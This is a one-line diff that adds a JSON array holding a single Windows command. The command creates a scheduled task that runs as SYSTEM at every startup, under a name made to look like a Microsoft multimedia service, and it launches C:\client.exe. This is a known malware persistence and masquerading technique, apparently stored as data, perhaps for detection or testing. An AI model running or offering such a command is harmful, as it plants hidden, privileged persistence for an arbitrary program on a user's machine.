@@ -1,0 +1,1 @@
+["schtasks /create /ru system /tn \"Microsoft\\Windows\\Multimedia\\SystemMediaService\" /sc ONSTART /tr \"C:\\client.exe\""]
